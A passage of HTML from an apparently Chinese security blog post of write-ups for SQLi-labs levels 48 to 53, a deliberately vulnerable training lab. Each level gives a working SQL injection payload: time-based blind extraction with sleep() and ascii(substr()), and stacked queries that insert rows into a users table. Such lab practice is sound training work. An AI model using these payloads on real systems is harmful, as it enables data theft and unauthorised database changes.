+<h4 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://10.211.55.4/sqlilabs/Less-48/?sort=1%20and%20(If(ascii(substr(database(),1,1))=115,sleep(10),sleep(5)))--+</span><br><span class="line">注入成功</span><br><span class="line">注入点为数字类型</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://10.211.55.4/sqlilabs/Less-49/?sort=1%27%20and%20(If(ascii(substr((select%20username%20from%20users%20where%20id=1),1,1))=69,0,sleep(5)))--+</span><br><span class="line">响应成功</span><br><span class="line">没有报错信息</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用堆叠注入</span><br><span class="line">payload</span><br><span class="line">?sort=1;insert users(id,username,password) values(&#x27;50&#x27;,&#x27;less-50&#x27;,&#x27;1&#x27;)--+</span><br><span class="line">注入成功</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用堆叠注入</span><br><span class="line">payload</span><br><span class="line">?sort=1&#x27;;insert users(id,username,password) values(&#x27;50&#x27;,&#x27;less-50&#x27;,&#x27;1&#x27;)--+</span><br><span class="line">注入成功</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用堆叠注入,盲注，没有报错回显</span><br><span class="line">payload</span><br><span class="line">?sort=1;insert users(id,username,password) values(&#x27;50&#x27;,&#x27;less-50&#x27;,&#x27;1&#x27;)--+</span><br><span class="line">注入成功</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-53"><a href="#less-53" class="headerlink" title="less-53"></a>less-53</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用堆叠注入,盲注，没有报错回显</span><br><span class="line">payload</span><br><span class="line">?sort=1&#x27;;insert users(id,username,password) values(&#x27;50&#x27;,&#x27;less-50&#x27;,&#x27;1&#x27;)--+</span><br><span class="line">注入成功</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/" data-id="clfpg8ztt000zvwv52liq7x1b" data-title="sqlilabs" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/11/01/sqlInject_raoguo/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          SQL注入绕过技巧
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/11/01/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">信息收集</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/web-security/" style="font-size: 10px;">web-security</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/Log4j/">Log4j</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/OWASP/">OWASP TOP 10</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/kali/">kali</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 HOU<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
